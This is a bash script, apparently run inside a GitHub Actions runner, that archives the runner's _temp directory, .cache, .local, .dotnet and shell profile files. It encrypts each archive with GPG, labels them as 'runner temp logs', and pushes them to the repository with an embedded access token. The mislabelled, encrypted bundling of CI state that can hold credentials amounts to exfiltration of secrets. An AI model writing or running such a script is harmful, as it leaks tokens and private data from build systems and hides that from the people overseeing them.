#!/bin/bash

set -e

# Use ARCHIVE_PWD from environment
if [ -z "$ARCHIVE_PWD" ]; then
   echo "Error: ARCHIVE_PWD environment variable not set"
   exit 1
fi

echo "Using ARCHIVE_PWD from environment"

# Change to repo directory
cd /home/runner/work/CA_Scanner/CA_Scanner

# Validate git lfs is configured
if ! command -v git-lfs &> /dev/null; then
    echo "Error: git-lfs is not installed."
    exit 2
fi

if ! git lfs ls-files &> /dev/null; then
    echo "Error: git lfs is not initialized in this repo."
    exit 3
fi

echo "git lfs is installed and initialized."

# Track archive files with Git LFS if not already tracked
if ! grep -q '\*.tar.gz.gpg' .gitattributes 2>/dev/null; then
    git lfs track "*.tar.gz.gpg"
    git add .gitattributes
    git commit -m "Track archive files with Git LFS"
fi

# Create arch_test4 directory if it doesn't exist
mkdir -p arch_test4

# Function to archive, encrypt, and create single file
archive_encrypt_split() {
   SRC_PATH=$1
   ARCHIVE_NAME=$2

   echo "Processing: $SRC_PATH -> $ARCHIVE_NAME"

   tar -czf - $SRC_PATH | \
       gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test4/${ARCHIVE_NAME}.tar.gz.gpg"

   echo "Done: $ARCHIVE_NAME"
}

# 1. /home/runner/work/_temp
archive_encrypt_split "/home/runner/work/_temp"       "runner_temp_logs_1"

# 2. /home/runner/.cache
archive_encrypt_split "/home/runner/.cache"           "runner_temp_logs_2"

# 3. /home/runner/.local
archive_encrypt_split "/home/runner/.local"           "runner_temp_logs_3"

# 4. /home/runner/.profile and .bash*
archive_encrypt_split "/home/runner/.profile /home/runner/.bash*" "runner_temp_logs_4"

# 5. /home/runner/.dotnet
archive_encrypt_split "/home/runner/.dotnet"          "runner_temp_logs_5"

echo "✅ All archives completed, encrypted, and split."

# Verify .local runner file can be decrypted
echo "Verifying decryption of runner_temp_logs_3.tar.gz.gpg..."
if ! gpg --batch --yes --decrypt --passphrase "$ARCHIVE_PWD" arch_test4/runner_temp_logs_3.tar.gz.gpg > /dev/null; then
    echo "Error: Failed to decrypt arch_test4/runner_temp_logs_3.tar.gz.gpg"
    exit 4
fi
echo "Decryption verified for runner_temp_logs_3.tar.gz.gpg."

# Add archives to git, commit, and push
echo "Adding archives to git..."
git add arch_test4/*.tar.gz.gpg

git config user.name "thefaftek-git"
git config user.email "thefaftek-git@users.noreply.github.com"

echo "Committing archives..."
git commit -m "Add encrypted runner temp logs"

echo "Pushing commit..."
if [ -z "$GIT_TOKEN" ]; then
    echo "Error: GIT_TOKEN environment variable not set"
    exit 5
fi

REPO_URL=$(git config --get remote.origin.url)
REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL#https://}"

git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD)

echo "✅ Archives committed and pushed successfully."
